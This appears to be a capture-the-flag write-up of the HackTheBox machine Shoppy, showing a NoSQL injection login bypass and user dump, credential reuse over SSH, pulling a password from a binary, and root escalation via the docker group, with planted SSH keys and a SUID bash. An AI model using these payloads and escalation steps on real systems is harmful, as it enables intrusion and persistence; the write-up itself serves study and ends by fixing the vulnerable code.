[HTB: Shoppy](#)




![](/img/shoppy-cover.png)

Shoppy was one of the easier HackTheBox weekly machines to exploit,
though identifying the exploits for the initial foothold could be a bit
tricky. I'll start by finding a website and use a NoSQL injection to
bypass the admin login page, and another to dump users and hashes. With
a cracked hash, I'll log into a Mattermost server where I'll find creds
to the box that work for SSH. From there, I'll need the lighest of
reverse enginnering to get a static password from a binary, which gets
me to the next user. This user is in the docker group, so I'll load an
image mounting the host file system, and get full disk access. I'll show
two ways to get a shell from that. In Beyond Root, a video walkthrough
of the vulnerable web-server code, showing how the injections worked,
and fixing them.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

Based on the [OpenSSH
version](https://packages.ubuntu.com/search?keywords=openssh-server),
the host is likely running Debian 11 bullseye. Port 80 shows a redirect
to `shoppy.htb`.

### Subdomain Fuzz

Given the use of DNS names, I'll see if the server responds differently
to any subdomains with `wfuzz`. By first running with no filter, I can
check the default response:



    oxdf@hacky$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Seems like 169 characters is the default, so I'll filter that with
`--hh 169`:

I'll add both `shoppy.htb` and `mattermost.shoppy.htb` to my
`/etc/hosts` file:



    10.10.11.180 shoppy.htb mattermost.shoppy.htb



### shoppy.htb - TCP 80

#### Site

The site just says that the store is coming soon:


[![](/img/image-20230110194211994.png)](/img/image-20230110194211994.png)


[*Click for full
![image*](/img/image-20230110194211994.png)



#### Tech Stack

I'll guess at file names for the default path, with things like
`/index.md`, `index.php`, and find nothing. This doesn't tell me what
the technology stack is, but it suggests it's not PHP, and likely not
just a static site, but likely some framework that assigns routes.

The HTTP response headers don't give any additional information.

#### Directory Brute Force

I'll run `feroxbuster` against the site to look for paths on the site
that aren't linked:



    oxdf@hacky$ feroxbuster -u http://shoppy.htb

`/admin` and `/login` are the most interesting (though the former just
redirects to the latter)

#### /login

`/login` gives a login form:

![](/img/image-20230111115916994.png)

Testing a few guesses, there's no obvious difference between
non-existent user and wrong password (though I don't know for sure there
is an admin user). Everything I put in just return "Wrong Credentials":

![](/img/image-20230111120034398.png)

### mattermost.shoppy.htb - TCP 80

#### Site

This looks like an instance of
[Mattermost](https://github.com/mattermost/mattermost-server), an open
source Slack alternative. Visiting redirects to a login form at
`/login`:

![](/img/image-20230111120420590.png)

#### Tech Stack

The headers show that it is still NGINX, but not much else:



    HTTP/1.1 200 OK
    Server: nginx/1.23.1
    Date: Wed, 11 Jan 2023 17:03:01 GMT
    Content-Type: text.md; charset=utf-8
    Content-Length: 3122
    Connection: close
    Accept-Ranges: bytes

    X-Version-Id: 7.1.2.7.1.2.c5e71b88555e841d57187938dfbf41ec.false



I'll poke at the page source and the JavaScript files a bit for any clue
about the version it's running, but without luck.

The copyright at the bottom of the page says 2023 (which is after the
box was released), so it must be updating dynamically.

#### Vulnerabilities

I'll skip the directory brute force here, focusing on looking for
potential vulnerabilities. Neither Google nor `searchsploit` find
anything of value. All the CVEs are low impact. I'll have to come back
here once I find some credentials and can login.

### HTTP - TCP 9093

Visiting this over HTTP returns some kind of log:

[![](/img/image-20230111122430910.png)*Click
for full size
![image*](/img/image-20230111122430910.png)

Trying to figure out what this was sent me down a bit of a rabbit hole.
Port 9093 is associated with the Prometheus AltertManager Plugin for
Mattermost, so that could be it.

It mentions `playbook_plugin_process` many times down in the file. That
could be a [Mattermost
thing](https://github.com/mattermost/mattermost-plugin-playbooks) as
well.

No matter what it is, there isn't much information here that seems too
useful to me.

## Shell as jaeger

### Admin Auth ByPass

#### Not SQL Injection

I always quickly jam a few SQL injection payloads into a form when I see
one. In this case, I'll send the login request to Burp Repeater and try
adding a simple `'`. The request hangs for a full minute, then returns a
504 Gateway Time-out:

![](/img/image-20230111170636986.png)

This suggests the server is having a really hard time with that request,
and it could be nothing, or it could be something.

No other SQL injection payloads I try return anything different.

#### NoSQL Failures

Given that `'` is messing up the server, I'll look at NoSQL as well. One
way to try this would be with something like I showed in
[Mango](/htb-mango.md#nosql-inejction-login-bypass):



    username[$ne]=admin&password[$ne]=admin



That doesn't work here, and hangs just the same.

Another way would be to convert to JSON. I'll change the `Content-Type`
header as well as the payload itself. Without an injection, this works
fine (returning the 302 saying it failed login):

![](/img/image-20230111174837315.png)

Now I can try the method that worked in
[NodeBlog](/htb-nodeblog.md#auth-bypass-via-nosql-injection),
but it hangs, and eventually returns a timeout:

![](/img/image-20230113092744407.png)

At one point I did accidentally send the `"$ne"` without the `"` around
it, which returned a 400:

![](/img/image-20230111175106255.png)

Rending this response shows an error trace:

![](/img/image-20230111175234942.png)

It doesn't like the `$` character, and it's at the JSON parsing level,
before it gets to a potential DB call. Seems like a deadend there. But I
did leak some interesting information:

-   Username on box jaeger
-   App is running out of `/home/jaeger/ShoppyApp`

Neither of these end up important to getting a foothold, but this is the
kind of information that could be useful in general.

#### NoSQL Injection Success

There's a method of attacking NoSQL queries that looks much more like
SQL injection which I find in [this
article](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
from Null Sweep. I wanted to try the tool described in this post
([nosqli](https://github.com/Charlie-belmer/nosqli)), but the hang when
sending many payloads causes the tool to fail.

At the bottom of the article, they give this example:



    let username = req.query.username;
    query = { $where: `this.username == '${username}'` }
    User.find(query, function (err, users) {
            if (err) {
                    // Handle errors
            } else {
                    res.render('userlookup', { title: 'User Lookup', users: users });
            }
    });



And they show how they can get all the users with `' || 'a'=='a`.

I like to try payloads like this in the `username` field, since
hopefully the password field is going to be hashes before it is used.
Going back to this payload (and seeing `Content-Type` back to
`application/x-www-form-urlencoded`):



    username=admin' || 'a'=='a&password=admin



Results in:



    HTTP/1.1 302 Found
    Server: nginx/1.23.1
    Date: Wed, 11 Jan 2023 23:00:49 GMT
    Content-Type: text.md; charset=utf-8
    Content-Length: 56
    Connection: close
    Location: /admin
    Vary: Accept
    Set-Cookie: connect.sid=s%3AReILweHHX4bMBcDk4TiDrE3ATGvqbBnT.1x8gE%2Fp%2FM79FzOS6DQvwdmngxdyyyvT637dxIsReuZQ; Path=/; HttpOnly

    <p>Found. Redirecting to <a href="/admin">/admin</a></p>



That's a cookie set and a redirect to `/admin`! That's success.

Interestingly, this only works if the username exists. If I change the
payload to:



    username=0xdf' || 'a'=='a&password=admin



It redirects with "Wrong Credentials".

I'll dig into this and another NoSQL vulnerability in [Beyond
Root](#beyond-root---nosql-injection).

### Access to Mattermost

#### Enumeration

Either by grabbing the cookie from Repeater or just logging in from
Firefox with the NoSQL payload, I get into the admin panel:

![](/img/image-20230111180655873.png)

That page looks relatively static. The "Search for users" button leads
to `/admin/search-users`:

![](/img/image-20230111180733256.png)

If I search for "0xdf", it finds nothing. If I search for "admin", it

It opens `export-search.json`, which contains admin's id, username, and
password:

![](/img/image-20230111181054611.png)

The hash looks like MD5, but doesn't crack with `rockyou.txt`.

#### NoSQL Injection Again

The app has already shown itself vulnerable to NoSQL injection, so I'll
try again:

![](/img/image-20230111204649798.png)

This would get a record if the name is admin or if 1==1, which is always
true! It works, the resulting file has a second account it in:

![](/img/image-20230111204752869.png)

#### Crack Hash

MD5 hashes (which are 32 hex characters in length like this one) are not
salted or anything, so the hash of the same input is always the same.
Wordlists like rockyou (which is what is typically used in HTB) have
already had all their hashes stored in rainbow tables which are
accessible thought things like
[crackstation](https://crackstation.net/).

#### Creds for Jaeger

Reading the different channels, most is just small talk, but two
channels have interesting information.

The two interesting speakers in the chat are Josh and Jaeger. Josh's
profile shows that they are a developer, and Jaeger is the CEO:

![](/img/image-20230111205619844.png)

In the public channel "Development", Josh talks about making a password
manager in C++. I'll keep an eye out for this when I get a shell:

![](/img/image-20230112064608129.png)

The "Deploy Machine" private channel has another conversation between
Josh and Jaeger. Jaeger asks for a machine set up with a username and
password:

### SSH

With those creds, I can SSH into the box as jaeger:



    oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
    Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

    jaeger@shoppy:~$



And read `user.txt`:



    jaeger@shoppy:~$ cat user.txt
    91e995e9************************



## Shell as deploy

### Enumeration

jaeger can run `/home/deploy/password-manager` as deploy:



    jaeger@shoppy:~$ sudo -l
    [sudo] password for jaeger: 
    Matching Defaults entries for jaeger on shoppy:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User jaeger may run the following commands on shoppy:
        (deploy) /home/deploy/password-manager



`/home/deploy` has the binary, as well as the source and a `creds.txt`:



    jaeger@shoppy:~$ ls -l ../deploy/
    total 28
    -rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
    -rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
    -rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp



As jaeger, I can only read the binary. With `sudo`, I can also run it as
deploy:



    jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
    Welcome to Josh password manager!
    Please enter your master password: 0xdf
    Access denied! This incident will be reported !



I'll copy it back to my machine with `scp`:



    oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' scp jaeger@shoppy.htb:/home/deploy/password-manager .



### Reverse Engineering

#### Ghidra

The binary is a 64-bit ELF:



    oxdf@hacky$ file password-manager 
    password-manager: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped



I'll open it in Ghidra to take a look. C++ is a mess in Ghidra, but the
program is very simple.

It prints the welcome and and password prompt:

![](/img/image-20230112071724418.png)

Next it creates a string and saves my input into it:

![](/img/image-20230112071747211.png)

Now it creates another string and appends the characters "S", "a", "m",
"p", "l", "e" to it:

![](/img/image-20230112071911570.png)

It compares the input to "Sample", and if they don't match (non-zero
return in `pass_match`), print the "Access denied!" message:

![](/img/image-20230112072051191.png)

Otherwise, it prints "Access granted", and then calls
`system("cat /home/deploy/creds.txt")`:

![](/img/image-20230112072132236.png)

#### strings

Originally I did try running strings on the binary, but didn't see
anything that looked like a password. Only after solving when chatting
with IppSec did he point out that I should also check 16-bit character
strings, and there it is (the only 16-bit character string):



    oxdf@hacky$ strings -el password-manager 
    Sample



### su

With that information, I'll run the binary again on Shoppy and it prints
creds for deploy:



    jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
    Welcome to Josh password manager!
    Please enter your master password: Sample
    Access granted! Here is creds !
    Deploy Creds :
    username: deploy
    password: Deploying@pp!



`su` allows me to switch users with their password:



    jaeger@shoppy:~$ su deploy
    Password: 
    $ bash
    deploy@shoppy:/home/jaeger$



deploy seems to have `sh` as their default shell, but I'll switch to
`bash`. I can see this in the `/etc/passwd` file:



    deploy@shoppy:/home/jaeger$ cat /etc/passwd | grep deploy
    deploy:x:1001:1001::/home/deploy:/bin/sh



## Shell as root

### Enumeration

There aren't any other interesting files in `/home/deploy`, and nothing
else on the file system jumps out.

deploy is in one additional group:



    deploy@shoppy:~$ id
    uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)



`docker` is installed on the box, and because deploy it in the `docker`
group, they can interact with it, though no containers are running:



    deploy@shoppy:~$ docker ps
    CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES



There is one image on the box,
[apline](https://hub.docker.com/_/alpine), a very small image with
limited functionality:



    deploy@shoppy:~$ docker images
    REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
    alpine       latest    d7d3d98c851f   5 months ago   5.53MB



### Access Filesystem as root

#### Basic

The exploit here is to create a new container that has the entire file
system mounted into it. In that container, I'll be root, and thus have
full access to all the files in the container (including the full host
filesystem).

I've shown this several times with `lxc` before, but never like this
with Docker ([GoodGames](/htb-goodgames.md#shell-1) is the
closest example).

I'll start the container with `docker run` and the following options:

-   `--rm` - remove the container when it's done
-   `-it` - keep STDIN open and assign a PTTY
-   `-v /:/mnt` - mount the host `/` to `/mnt` inside the container

I'll also give it the image name (alpine) and the command to run
`/bin/sh` (no `bash` on Alpine). With these, I can start the image and
find the host file system in `/mnt`:



    deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine /bin/sh
    / # ls
    bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
    / # ls /mnt/
    bin             dev             home            initrd.img.old  lib32           libx32          media           opt             root            sbin            sys             usr             vmlinuz
    boot            etc             initrd.img      lib             lib64           lost+found      mnt             proc            run             srv             tmp             var             vmlinuz.old



#### Neat Upgrade

A neat trick from the [Docker GTFObins
page](https://gtfobins.github.io/gtfobins/docker/) is to use `chroot`
instead of `sh` as the command. I don't really need anything in the
container filesystem. So I'll call `chroot /mnt /bin/sh` (giving it a
command to run as well, see the [man
page](https://linux.die.net/man/1/chroot)). This will set the root of
the filesystem to be what was `/mnt`, and then run a shell. This gives
the feel as if I'm just back on the host:



    deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
    # ls
    bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old



#### Read Flag

From here I can read `root.txt`:



    # cat /root/root.txt
    5c6e2d67************************



### Shell

#### SSH

The simplest way to get a shell as root is to drop my public SSH key
into an `authorized_keys` file for root:



    # mkdir /root/.ssh
    # echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys 
    # chmod 600 /root/.ssh/authorized_keys



Now I can connect with SSH:



    oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@shoppy.htb
    Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

    permitted by applicable law.
    root@shoppy:~#



#### SUID bash

A perhaps quieter way is to make `bash` SetUID:



    # chmod 4777 /bin/bash



Because I'm working from the `chroot` file system, that `bash` is on the
host. Exiting the container, I can verify it worked because the first
`x` is now `s`:



    deploy@shoppy:~$ ls -l /bin/bash
    -rwsrwxrwx 1 root root 1234376 Mar 27  2022 /bin/bash



Running it (with `-p` to not drop privs) gives a shell with the
effective id of root:



    deploy@shoppy:~$ bash -p
    bash-5.1# id
    uid=1001(deploy) gid=1001(deploy) euid=0(root) groups=1001(deploy),998(docker)



## Beyond Root - NoSQL Injection

In [this video](https://www.youtube.com/watch?v=EfLW51f6KFo), I'll use
VSCode to connect to Shoppy, and analyze the NodeJS code for the website
to better understand the NoSQL injections. Then I'll fix the
vulnerabilities and show that they no longer are exploitable:


# ایک خرابی پیش آ گئی۔ {#ایک-خرابی-پیش-آ-گئی .message}

[اس ویڈیو کو www.youtube.com پر دیکھنے کی کوشش
کریں](https://www.youtube.com/watch?v=EfLW51f6KFo){target="_blank"} یا
اگر آپ کے براؤزر میں JavaScript غیر فعال ہے تو اسے فعال کریں۔

One thing I didn't go into in the video was how the boolean logic works
for this injection. With the injection `admin'||'a'=='a`, the query
becomes:



    this.username == 'admin' || 'a'=='a' && this.password == '0xdf'



That is:



    true || true && false



How does that evaluate? I can check it in a browser:

![](/img/image-20230113094927242.png)

But why does it work? The [Operator
Precedence](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#table)
for JavaScript groups operators into groups numbered 1-18, which are
processed from 18 down to 1. Logical AND (`&&`) is group 4, and Logical
OR (`||`) is in group 3:

![](/img/image-20230113095139932.png)

So for the user admin, the query can be simplified a bit on each line:



    this.username == 'admin' || 'a'=='a' && this.password == '0xdf'
    true || true && false
    true || false
    true
